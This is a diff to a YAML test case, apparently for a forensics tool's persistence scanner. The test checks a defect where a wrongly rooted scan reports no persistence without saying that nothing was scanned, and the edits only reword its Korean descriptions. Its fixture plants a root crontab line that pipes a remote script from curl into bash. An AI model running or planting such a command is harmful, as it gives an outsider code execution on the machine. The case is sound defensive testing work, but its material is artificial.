@@ -13,19 +13,19 @@ realism: common
 realism_ko: "모델이 `fs/` 대신 사건 폴더를 루트로 넘기는 실수는 흔하다."
 coverage: full
 summary: When root_path is the case folder instead of its fs/ subfolder, so no etc/ or other scanned directory exists under it, find_persistence answers "No persistence mechanisms found under ..." without saying nothing was scanned, while the fs/ root below holds a cron job that downloads and runs a script.
-summary_ko: "root_path가 fs/ 하위 폴더가 아니라 사건 폴더여서 그 아래에 etc/나 다른 검사 대상 디렉터리가 없으면, find_persistence는 아무것도 검사하지 않았다는 말 없이 \"No persistence mechanisms found under ...\"라고 답한다. 그 아래의 fs/ 루트에는 스크립트를 내려받아 실행하는 cron 작업이 있다."
-defect_ko: "정상이라면 검사할 폴더가 하나도 없으면 그렇다고 알려야 하는데, 이 서버는 아무것도 검사하지 않고 지속성이 없다고 답한다. 그래서 모델은 한 단계 아래에 있는 악성 cron 작업이 없다고 잘못 안다."
+summary_ko: "`root_path`를 `fs/` 하위 폴더가 아니라 사건 폴더로 주면 그 아래에 `etc/` 같은 검사 대상이 없다. `find_persistence`는 아무것도 검사하지 않았다는 말 없이 \"No persistence mechanisms found under ...\"라고 답하는데, 그 아래 `fs/`에는 스크립트를 내려받아 실행하는 cron 작업이 있다."
+defect_ko: "검사할 폴더가 하나도 없어도 이 서버는 지속성이 없다고 답한다. 그렇다고 알려야 한다. 모델은 한 단계 아래에 있는 악성 cron 작업이 없다고 잘못 안다."
 setup_ko: "`case/fs/etc/crontab`에 내려받아 실행하는 작업을 두었다."
 fixture:
   - path: case/fs/etc/crontab
     text: "* * * * * root curl -s http://203.0.113.7/x.sh | bash\n"
 steps:
   - tool: find_persistence
-    note_ko: "결함이 있는 호출: 사건 폴더를 루트로 검사"
+    note_ko: "결함 호출: 사건 폴더를 루트로 검사"
     args:
       root_path: ${EVIDENCE}/case
   - tool: find_persistence
-    note_ko: "비교용: `fs/`를 루트로 검사"
+    note_ko: "비교 호출: `fs/`를 루트로 검사"
     args:
       root_path: ${EVIDENCE}/case/fs
 expect:
